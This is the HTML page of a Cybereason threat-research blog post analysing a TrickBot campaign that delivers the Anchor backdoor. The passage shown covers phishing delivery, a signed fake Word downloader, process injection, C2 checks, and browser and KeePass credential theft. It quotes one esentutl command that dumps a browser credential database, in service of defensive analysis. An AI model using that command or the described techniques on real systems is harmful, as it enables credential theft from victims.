<!doctype html><!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en" > <![endif]--><!--[if IE 7]>    <html class="no-js lt-ie9 lt-ie8" lang="en" >        <![endif]--><!--[if IE 8]>    <html class="no-js lt-ie9" lang="en" >               <![endif]--><!--[if gt IE 8]><!--><html class="no-js" lang="en"><!--<![endif]--><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="author" content="Cybereason Nocturnus">
    <meta name="description" content="Cybereason Nocturnus detected a series of targeted attacks against high-profile targets that uses a new variant of Anchor_DNS and a new malware dubbed Anchor.">
    <meta name="generator" content="HubSpot">
    <title>Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware</title>
    <link rel="shortcut icon" href="https://www.cybereason.com/hubfs/favicon-1.ico">
    

    <script src="/hs/hsstatic/jquery-libs/static-1.4/jquery/jquery-1.11.2.js"></script>
<script>hsjQuery = window['jQuery'];</script>
    <meta property="og:description" content="Cybereason Nocturnus detected a series of targeted attacks against high-profile targets that uses a new variant of Anchor_DNS and a new malware dubbed Anchor.">
    <meta property="og:title" content="Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware">
    <meta name="twitter:description" content="Cybereason Nocturnus detected a series of targeted attacks against high-profile targets that uses a new variant of Anchor_DNS and a new malware dubbed Anchor.">
    <meta name="twitter:title" content="Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware">

    

    
    <style>
a.cta_button{-moz-box-sizing:content-box !important;-webkit-box-sizing:content-box !important;box-sizing:content-box !important;vertical-align:middle}.hs-breadcrumb-menu{list-style-type:none;margin:0px 0px 0px 0px;padding:0px 0px 0px 0px}.hs-breadcrumb-menu-item{float:left;padding:10px 0px 10px 10px}.hs-breadcrumb-menu-divider:before{content:'›';padding-left:10px}.hs-featured-image-link{border:0}.hs-featured-image{float:right;margin:0 0 20px 20px;max-width:50%}@media (max-width: 568px){.hs-featured-image{float:none;margin:0;width:100%;max-width:100%}}.hs-screen-reader-text{clip:rect(1px, 1px, 1px, 1px);height:1px;overflow:hidden;position:absolute !important;width:1px}
</style>

<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/module_assets/41681847227/1619109182781/module_41681847227_CR_-_Malicious_Life_Network_--_Tier_One_Header.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/module_assets/41682410610/1618194603032/module_41682410610_CR_-_Malicious_Life_Network_--_Main_Hero.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/module_assets/43300360745/1617857458537/module_43300360745_CR_-_Malicious_Life_Network_--_Related_Posts.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/module_assets/34473990280/1617772255567/module_34473990280_CR_-_Footer_Full__en_US.min.css">
    

    
<!--  Added by GoogleAnalytics integration -->
<script>
var _hsp = window._hsp = window._hsp || [];
_hsp.push(['addPrivacyConsentListener', function(consent) { if (consent.allowed || (consent.categories && consent.categories.analytics)) {
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create','UA-56367941-1','auto');
  ga('send','pageview');
}}]);
</script>

<!-- /Added by GoogleAnalytics integration -->

<!--  Added by GoogleTagManager integration -->
<script>
var _hsp = window._hsp = window._hsp || []; _hsp.push(['addPrivacyConsentListener', function(consent) { if (consent.allowed || (consent.categories && consent.categories.analytics)) {
(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-TJVVB7C');
}}]);
</script>

<!-- /Added by GoogleTagManager integration -->


<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="https://use.typekit.net/vyv2ljd.js"></script>
<script>try{Typekit.load({ async: false });}catch(e){}</script>
<link rel="amphtml" href="https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware?hs_amp=true">

<meta property="og:image" content="https://www.cybereason.com/hubfs/milan-degraeve-0ztvUdH5b-A-unsplash.jpg#keepProtocol">
<meta property="og:image:alt" content="milan-degraeve-0ztvUdH5b-A-unsplash">
<meta name="twitter:image" content="https://www.cybereason.com/hubfs/milan-degraeve-0ztvUdH5b-A-unsplash.jpg#keepProtocol">
<meta name="twitter:image:alt" content="milan-degraeve-0ztvUdH5b-A-unsplash">

<meta property="og:url" content="https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware">
<meta name="twitter:card" content="summary">
<meta name="twitter:creator" content="@cr_nocturnus">

<link rel="canonical" href="https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware">

<meta property="og:type" content="article">
<link rel="alternate" type="application/rss+xml" href="https://www.cybereason.com/blog/rss.xml">
<meta name="twitter:domain" content="www.cybereason.com">
<script src="//platform.linkedin.com/in.js" type="text/javascript">
    lang: en_US
</script>

<meta http-equiv="content-language" content="en">
<link rel="stylesheet" href="//cdn2.hubspot.net/hub/7052064/hub_generated/template_assets/1621526769050/hubspot/hubspot_default/shared/responsive/layout.min.css">


<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/template_assets/34470223313/1613710752320/__CR_Web_Platform_2020/CSS/cr-master__cta.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/template_assets/34470477360/1621270587578/__CR_Web_Platform_2020/CSS/cr-master__main.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/template_assets/35275979682/1600880367101/__CR_Web_Platform_2020/CSS/ionicons.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/template_assets/42760289143/1621016677351/__CR_Web_Platform_2020/CSS/cr-mln__build.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/template_assets/34470224480/1614969030468/__CR_Web_Platform_2020/CSS/bulma/cr-framework__bulma-columns.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/template_assets/35291999472/1614661129976/__CR_Web_Platform_2020/CSS/bulma/cr-framework__bulma.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/template_assets/42363645447/1614911253070/__CR_Web_Platform_2020/CSS/hamburger-animation.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/template_assets/42507091846/1614920868925/__CR_Web_Platform_2020/CSS/animate.min.min.css">


    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<script src="/hubfs/dam/plugins/marker-animation.js"></script>
<script>
$(document).ready(function() {
  $('.highlight').markerAnimation({
    "color":'#FFC628',
    "font_weight":'normal',
    "background-size": '200% 1.2em'
  });
});
</script>

    

</head>
<body class="   hs-content-id-23309573296 hs-blog-post hs-blog-id-5272851739" style="">
<!--  Added by GoogleTagManager integration -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TJVVB7C" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>

<!-- /Added by GoogleTagManager integration -->

    <div class="header-container-wrapper">
    <div class="header-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_1615433790649568" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><section id="cr-malicious-life-network__tier-one-header">
  <div class="#">
    <div id="logo"><a href="https://www.cybereason.com"><img src="https://www.cybereason.com/hubfs/dam/images/images-web/logos/cr-logo-web-horizontal-black-500px.png"></a></div>
    <div id="back-to">
      <a href="https://www.cybereason.com">Back to <span>Cybereason.com</span></a>
    </div>
    <!-- Hamburger Menu -->
    <button class="hamburger hamburger--collapse" type="button">
      <span class="hamburger-box">
        <span class="hamburger-inner"></span>
      </span>
    </button>
    <div class="cr-mln__hamburger-menu--overlay">
      <ul>
        <li><a href="https://www.cybereason.com/blog/all">All Posts</a></li>
        <li><a href="/blog/category/research"><span class="underline">Research</span></a></li>
        <li><a href="/blog/category/podcasts"><span class="underline">Podcasts</span></a></li>
        <li><a href="/blog/category/webinars"><span class="underline">Webinars</span></a></li>
        <li><a href="/blog/category/resources"><span class="underline">Resources</span></a></li>
        <li><a href="/blog/category/videos"><span class="underline">Videos</span></a></li>
        <li><a href="/blog/category/news">News</a></li>
      </ul>
      <div class="subscribe">
        <a href="#blog-subscribe">Subscribe</a>
      </div>
    </div>
    <!-- -->
  </div>
</section></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-2 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget mln-homepage" style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_1615433785464566" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><section class="cr-malicious-life-network__hero-main base">
  <div class="container-is-blog columns hero-content page-center">
    <div class="column is-5-fullhd is-5-desktop is-12-touch">
      <a href="/blog"><img class="cr-mln-logo" src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/cr-malicious-life-network-logo.svg"></a>
    </div>
    <div class="column is-7-fullhd is-7-desktop is-hidden-mobile is-hidden-tablet-only">
      <div class="cr-mln__search-subscribe">
        <div class="cr-mln__search">
          <a href="#cr-search-modal" class="search-btn"><img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/cr-blog-icon--search-dark-gray.png" alt="Search"></a>
        </div>
        <div class="cr-mln__subscribe">
          <a class="btn-subscribe" href="#blog-subscribe">Subscribe</a>
        </div>
      </div>
      <div class="cr-mln__category-nav">
        <ul>
          <li><a href="https://www.cybereason.com/blog/all"><span class="underline">All</span></a></li>
          <li><a href="/blog/category/research"><span class="underline">Research</span></a></li>
          <li><a href="/blog/category/podcasts"><span class="underline">Podcasts</span></a></li>
          <li><a href="/blog/category/webinars"><span class="underline">Webinars</span></a></li>
          <li><a href="/blog/category/resources"><span class="underline">Resources</span></a></li>
          <li><a href="/blog/category/videos"><span class="underline">Videos</span></a></li>
          <li><a href="/blog/category/news"><span class="underline">News</span></a></li>
        </ul>
      </div>
    </div>
  </div>
      <!-- MOBILE Search and Subscribe -->
      <div class="container-is-blog columns is-gapless is-hidden-desktop cr-mln__search-subscribe--mobile">
        <div class="column">
          <a class="search-btn">Search</a>
        </div>
        <div class="column">
          <a class="#" href="#blog-subscribe">Subscribe</a>
        </div>
      </div>

      <!-- END MOBILE Search and Subscribe -->
  
  <!-- SEARCH Modal Wrap -->

  <div id="cr-search-modal">
        <!--THIS IS IMPORTANT! to close the modal, the class name has to match the name given on the ID -->
        <div id="btn-close-modal" class="close-cr-search-modal"> 
            X
        </div>

        <div class="modal-content">
            <div class="container columns">
              <div class="column">
                <div class="cr-search-modal__search-bar">
                  <h3>Search</h3>
                  <form action="/hs-search-results">
                    <input type="search" class="hs-search-field__input" name="term" autocomplete="on" placeholder="Search...">
                    <input type="hidden" name="type" value="BLOG_POST">
                    <input type="hidden" name="type" value="LISTING_PAGE">
                    <button type="submit" class="arrow"></button>
                  </form>
                  
                </div>

              </div>
          </div>
        </div>
    </div>
  <!-- END Search Modal Wrap -->

</section></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end header -->
</div><!--end header wrapper -->

<div class="body-container-wrapper">
    <div class="body-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-blog_content " style="" data-widget-type="blog_content" data-x="0" data-w="12">






<div class="cr-mln__blog-post">
  <div class="container-is-blog columns is-multiline page-center">
    <div class="column is-2-fullhd is-2-desktop is-10-tablet is-hidden-mobile cr-mln__post-author-share">
      &nbsp;
    </div>
    <div class="column is-8-fullhd is-8-desktop is-10-tablet is-offset-1-tablet">
      <div class="featured-image"><img src="https://www.cybereason.com/hubfs/milan-degraeve-0ztvUdH5b-A-unsplash.jpg" alt=""></div>
      <h1><span id="hs_cos_wrapper_name" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="text">Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware</span></h1>
      <p class="date-and-duration">
        <span class="publish-date">December 11, 2019 |</span>
        <span class="read-time">
          
          
          
          
          
          15 minute read
          
        </span>
      </p>
    </div>
    
    <!-- Sticky Author and Social Box -->
    
    <!-- END Sticky Author and Social Box -->
      <div class="container-is-blog columns is-multiline page-center cr-mln__blog-post--body">
        
        <div class="column is-2-fullhd is-2-desktop is-10-tablet is-12-mobile is-offset-1-tablet is-offset-1-mobile cr-mln__post-author-share">
         <div id="hubspot-author_data" class="hubspot-editable cr-mln__post-meta" data-hubspot-form-id="author_data" data-hubspot-name="Blog Author">
            
              <span class="descriptor">Written By</span>
              <p><span class="author">Cybereason Nocturnus</span></p>
             
          </div>
          <div class="cr-blog-post__social-sharing">
            <div id="hs_cos_wrapper_module_161724375084957" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-social_sharing" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">






<div class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_social_sharing" data-hs-cos-general-type="widget" data-hs-cos-type="social_sharing">
  
	
  
    
    
    
			
		

    <a href="https://twitter.com/intent/tweet?original_referer=https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware&amp;utm_medium=social&amp;utm_source=twitter&amp;url=https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware&amp;utm_medium=social&amp;utm_source=twitter&amp;source=tweetbutton&amp;text=" target="_blank" rel="noopener" style="width:16px;">
      <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/twitter-gray.svg" class="hs-image-widget hs-image-social-sharing-24" style="height:16px;width:16px;" width="16" hspace="0" alt="Share on twitter">
    </a>
	

  
	
  
    
    
    
			
		

    <a href="http://www.facebook.com/share.php?u=https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware&amp;utm_medium=social&amp;utm_source=facebook" target="_blank" rel="noopener" style="width:16px;">
      <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/facebook-gray.svg" class="hs-image-widget hs-image-social-sharing-24" style="height:16px;width:16px;" width="16" hspace="0" alt="Share on facebook">
    </a>
	

  
	
  
    
    
    
			
		

    <a href="http://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware&amp;utm_medium=social&amp;utm_source=linkedin" target="_blank" rel="noopener" style="width:16px;">
      <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/linkedin-gray.svg" class="hs-image-widget hs-image-social-sharing-24" style="height:16px;width:16px;" width="16" hspace="0" alt="Share on linkedin">
    </a>
	

</div></div>
          </div> 
        </div>
        <div class="column is-8-fullhd is-8-desktop is-10-tablet is-10-mobile is-offset-0-fullhd is-offset-0-desktop is-offset-1-tablet is-offset-1-mobile">
          <span id="hs_cos_wrapper_post_body" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_rich_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><h2 style="line-height: 1.75; font-size: 48px;">Introduction</h2>
<p><strong style="font-family: DIN-Condensed, sans-serif; font-size: 30px;">Research By:</strong><span style="font-family: DIN-Condensed, sans-serif; font-size: 30px;"> Assaf Dahan, Lior Rochberger, Eli Salem, Mary Zhao, Niv Yona, Omer Yampel and Matt Hart</span></p>
<p>Cybereason Nocturnus is monitoring a new wave of targeted campaigns against financial, manufacturing and retail businesses that began in early October. Similar to attacks <a href="https://www.cybereason.com/blog/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware">previously reported by Cybereason</a>, this campaign started with a <a href="https://attack.mitre.org/software/S0266/">TrickBot</a> infection and progressed into a hacking operation targeting sensitive financial systems.</p>
<!--more-->
<p>However, unlike previous operations that focused on causing a massive ransomware infection (<a href="https://www.cybereason.com/blog/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware">Ryuk</a> and <a href="https://www.fortinet.com/blog/threat-research/lockergoga-ransomeware-targeting-critical-infrastructure.html">LockerGoga</a>) by compromising critical assets like the domain controller, this new operation is focused on targeting point of sale (PoS) systems. The campaign leverages a newly discovered malware family called <em>Anchor</em> exclusively for high-profile targets.</p>
<p><span style="font-weight: bold; font-style: italic;">Learn more about </span><a href="/blog/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware" rel=" noopener" style="font-weight: bold; font-style: italic;">additional attacks that leverage TrickBot.</a></p>
<p>This research focuses on the following aspects of the TrickBot-Anchor attack:</p>
<ol>
<li><strong>Anatomy of the Attack:</strong> <strong>A</strong> <strong>step-by-step anatomy</strong> of the attacks, including infection vectors and a dissection of the tools and techniques used by the attackers.</li>
<li><strong>New Malware:</strong> <strong>The discovery of a new malware family called <em>Anchor</em></strong>, which includes the <a href="https://technical.nttsecurity.com/post/102fsp2/trickbot-variant-anchor-dns-communicating-over-dns">Anchor_DNS</a> and a new, undocumented <em>Anchor </em>that has been operating since August 2018 (and potentially even earlier). The <em>Anchor</em> malware is a backdoor used very selectively on high-profile targets, and appears to be tightly connected to TrickBot, potentially even authored by the same individuals who created TrickBot.</li>
</ol>
<p>While this blog does not discuss attribution explicitly, the nature of these attacks, specifically the motivation, some of the tools and techniques detailed,&nbsp; have certain resemblance to past attacks that were linked to the financially-motivated <a href="https://attack.mitre.org/groups/G0037/">FIN6</a> threat actor, a group that <a href="https://usa.visa.com/dam/VCOM/global/support-legal/documents/fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf">is known to target POS systems</a> and has <a href="https://www.zdnet.com/article/cybercrime-group-fin6-evolves-from-pos-malware-to-ransomware/">been linked to TrickBot infections</a> in the past.</p>
<p>Lastly, our blog emphasizes the gravity and danger that lies in commodity malware infections, as they have the potential of escalating into a hacking operation. This can easily lead to a disastrous outcome, whether it be a ransomware infection or theft of sensitive financial data.</p>
<h2>Key Points</h2>
<ul>
<li><strong>The TrickBot-Anchor Operation:</strong> Cybereason Nocturnus is investigating a series of targeted attacks against financial, manufacturing, and retail businesses across the United States and Europe.</li>
<li><strong>Targets POS Systems:</strong> The attacks target POS systems to steal sensitive information by taking over critical assets in the victims’ network.</li>
<li><strong>Deploys A Backdoor on High-value Targets:</strong> On certain high-profile targets, the attackers selectively use a new variant of the rare <a href="https://technical.nttsecurity.com/post/102fsp2/trickbot-variant-anchor-dns-communicating-over-dns">Anchor_DNS</a> tool. Anchor_DNS is a backdoor that uses the DNS protocol to stealthily communicate with C2 servers.</li>
<li><strong>Uses a New, Undocumented Malware</strong>: In addition to the new <em>Anchor_DNS</em> variant, the attackers use a completely new and previously undocumented malware dubbed <strong><em>Anchor.</em></strong> <em>Anchor</em> has been in operation since August 2018 and appears to be tightly related to TrickBot.</li>
<li><strong>Adds Enhancements to TrickBot:</strong> This attack adds a new and enhanced stealing module to TrickBot that focuses on stealing passwords from various products, including the <a href="https://keepass.info/">KeePass</a> password manager.</li>
<li><strong>Uses Known Tools for Reconnaissance and Lateral Movement:</strong> The majority of the initial interactive hacking operation uses the known tools <a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter">Meterpreter</a>, <a href="https://github.com/EmpireProject/Empire">PowerShell Empire</a>, and <a href="https://www.cobaltstrike.com/">Cobalt Strike</a> for reconnaissance and lateral movement.</li>
<li><strong>Abuses the Trust of Certificate Authorities</strong>: Many of the payloads in the attacks are signed binaries, which demonstrates <a href="https://medium.com/@chroniclesec/abusing-code-signing-for-profit-ef80a37b50f4">the ever-growing trend of signed threats</a> that abuse the trust of certificate authorities to bypass detection.</li>
</ul>
<h2>Table of Contents</h2>
<ul>
<li><a href="#anatomy" rel=" noopener"><strong>Anatomy of the Attack: A Step-by-Step Analysis</strong></a>
<ul>
<li><a href="#vector" rel=" noopener">Infection Vector</a></li>
<li><a href="#trickbotinfection" rel=" noopener">From TrickBot Infection to Interactive Hacking</a></li>
<li><a href="#meterpreterandcobaltstrike" rel=" noopener">Meterpreter &amp; Cobalt Strike Implants</a></li>
<li><a href="#adfind" rel=" noopener">Active Directory Discovery using ADfind</a></li>
</ul>
</li>
<li><a href="#anchordnsvariant" rel=" noopener"><strong>New Anchor_DNS Variant Discovered</strong></a></li>
<li><a href="#anchorandtrickbot" rel=" noopener"><strong>Discovery of The Anchor Malware and its Connection to TrickBot</strong></a></li>
<li><a href="#signed" rel=" noopener"><strong>Rise of Signed Malware</strong></a></li>
<li><a href="#conclusion" rel=" noopener"><strong>Conclusion</strong></a></li>
<li><a href="#IOCs" rel=" noopener"><strong>Indicators of Compromise</strong></a></li>
<li><a href="#mitre" rel=" noopener"><strong>MITRE ATT&amp;CK BREAKDOWN</strong></a></li>
</ul>
<a id="anatomy" data-hs-anchor="true"></a>
<h2>Anatomy of the Attack: A Step-by-Step Analysis</h2>
<p>&nbsp;</p>
<div><img src="https://www.cybereason.com/hs-fs/hubfs/anchor-blog-anatomy.png?width=780&amp;name=anchor-blog-anatomy.png" alt="anchor-blog-anatomy" width="780" style="display: block; margin-left: auto; margin-right: auto; width: 780px;" srcset="https://www.cybereason.com/hs-fs/hubfs/anchor-blog-anatomy.png?width=390&amp;name=anchor-blog-anatomy.png 390w, https://www.cybereason.com/hs-fs/hubfs/anchor-blog-anatomy.png?width=780&amp;name=anchor-blog-anatomy.png 780w, https://www.cybereason.com/hs-fs/hubfs/anchor-blog-anatomy.png?width=1170&amp;name=anchor-blog-anatomy.png 1170w, https://www.cybereason.com/hs-fs/hubfs/anchor-blog-anatomy.png?width=1560&amp;name=anchor-blog-anatomy.png 1560w, https://www.cybereason.com/hs-fs/hubfs/anchor-blog-anatomy.png?width=1950&amp;name=anchor-blog-anatomy.png 1950w, https://www.cybereason.com/hs-fs/hubfs/anchor-blog-anatomy.png?width=2340&amp;name=anchor-blog-anatomy.png 2340w" sizes="(max-width: 780px) 100vw, 780px"></div>
<p style="text-align: center;"><em>An overview of the attack tree, as seen in the Cybereason Defense Platform.</em></p>
<a id="vector" data-hs-anchor="true"></a>
<h2>Infection Vector</h2>
<p><img src="https://www.cybereason.com/hubfs/image-143.png" style="display: block; margin-left: auto; margin-right: auto;"></p>
<p style="text-align: center;"><em>Downloading and injecting TrickBot.</em></p>
<p>The attack starts with a phishing email that contains a malicious link to a file hosted on Google Docs named “Annual Bonus Report.doc”. When the user clicks on the link, the TrickBot dropper downloads onto the target machine. This differs from previous TrickBot attacks we have seen, where TrickBot is usually dropped through a Microsoft Office document or by another malware like <a href="https://www.cybereason.com/blog/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware">Emotet</a>.</p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-136.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>Phishing email that tricks the user into downloading TrickBot.</em></p>
<h3>The TrickBot Downloader</h3>
<p>The campaigns use a TrickBot downloader that is signed and uses an icon to pretend it is a Microsoft Word document. When the user double-clicks the file, they are presented with a decoy message box. To avoid suspicion, the decoy message suggests the user should update Microsoft Word or open the file from another computer.</p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-150.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>TrickBot displays a message box suggests updating Microsoft Word or opening the file on another computer to preview the document. </em></p>
<p>While at first glance these files can be mistaken for legitimate Microsoft Word files, a closer inspection of the file metadata indicates they are not associated with Microsoft Word, nor are they Microsoft Word document files.</p>
<p>Most of the initial payloads in these campaigns are signed with valid certificates to evade security tools. They abuse the relative trust that is given to signed binaries to avoid detection.</p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-152.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>File metadata properties for the fake Microsoft Word Document.</em></p>
<p><img src="https://www.cybereason.com/hubfs/image-144.png" style="display: block; margin-left: auto; margin-right: auto;"></p>
<p style="text-align: center;"><em>Signed malware is an evasive initial entry point into an organization.</em></p>
<p>The message box distracts the user as TrickBot’s payload is downloaded, stored in the %TEMP% folder, and executed. A new process injects the TrickBot payload into a svchost.exe process.</p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-149.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>svchost.exe injected code malicious evidence as seen in the Cybereason Platform.</em></p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-168.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><br>Domain associated with the TrickBot payload download.</p>
<h2>The TrickBot Payload</h2>
<p>Once TrickBot’s main payload is injected into the svchost.exe process, it carries out a series of reconnaissance-related tasks to profile the infected endpoint and the network. This information is crucial, as it determines the course of the attack.</p>
<p><strong>Checking Network Connectivity</strong></p>
<p>TrickBot checks for Internet connectivity by trying to access several designated domains. These domains are preconfigured and belong to legitimate web services, including: checkip.amazonaws.com, ipecho.net, ipinfo.io, api.ipify.org, icanhazip.com, myexternalip.com, wtfismyip.com, ip.anysrc.net.</p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-118.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p>Once TrickBot verifies it can connect to the Internet, it communicates with C2 servers, some of which using TOR-related domains. It collects and sends information about where the target machine is located to the C2 servers.</p>
<p><strong>Browser History and Credential Theft</strong></p>
<p>After TrickBot establishes Internet access and sends information about the location of the target machine, it starts its malicious activity. The module core-parser.dll is reflectively loaded into svchost.exe. <a href="https://www.fortinet.com/blog/threat-research/deep-analysis-of-trickbot-new-module-pwgrab.html">core-parser.dll parses the TrickBot config files</a> and extracts IP addresses for secondary C2 communication, redirection, and web injection logic.</p>
<p><img src="https://www.cybereason.com/hs-fs/hubfs/image-145.png?width=501&amp;name=image-145.png" width="501" style="width: 501px; display: block; margin-left: auto; margin-right: auto;" srcset="https://www.cybereason.com/hs-fs/hubfs/image-145.png?width=251&amp;name=image-145.png 251w, https://www.cybereason.com/hs-fs/hubfs/image-145.png?width=501&amp;name=image-145.png 501w, https://www.cybereason.com/hs-fs/hubfs/image-145.png?width=752&amp;name=image-145.png 752w, https://www.cybereason.com/hs-fs/hubfs/image-145.png?width=1002&amp;name=image-145.png 1002w, https://www.cybereason.com/hs-fs/hubfs/image-145.png?width=1253&amp;name=image-145.png 1253w, https://www.cybereason.com/hs-fs/hubfs/image-145.png?width=1503&amp;name=image-145.png 1503w" sizes="(max-width: 501px) 100vw, 501px"></p>
<p style="text-align: center;"><em>core-parser.dll injected into svchost.dll.</em></p>
<p>TrickBot sends the reconnaissance information from the target machine to a hardcoded C2 server. The C2 server is responsible for handling the stolen data.</p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-144.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>A list of C2 servers extracted from TrickBot’s configuration.</em></p>
<p>TrickBot also steals data from Internet Explorer by executing the <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh875546(v%3Dws.11)">built-in Windows tool ESENTUTL</a> using the living-off-the-land technique (LOLBin).</p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-119.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<pre style="text-align: center;"><em>esentutl /p /o C:\Users\[USER]\AppData\Local\Temp\grabber_temp.edb</em></pre>
<p>This command dumps the <a href="https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/">Extensible Storage Engine (ESE) database format</a>.</p>
<p><strong>Application-specific Credential Theft</strong></p>
<p>This variant of TrickBot employs a new, unique ability to steal passwords from <a href="https://keepass.info/">KeePass</a>, a free, open- source password manager. TrickBot's KeePass stealing capabilities seem to be inspired (or even partially copy-pasted) from a publicly available tool dubbed <a href="https://github.com/wevans311082/PoshKPBrute">PoshKPBrute</a>, a script that performs a dictionary attack against KeePass .kdbx files. Once it finds the dictionary key, it dumps all passwords as an output and sends the attackers the master password.</p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-135.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>KeePass stealing brute force tool.</em></p>
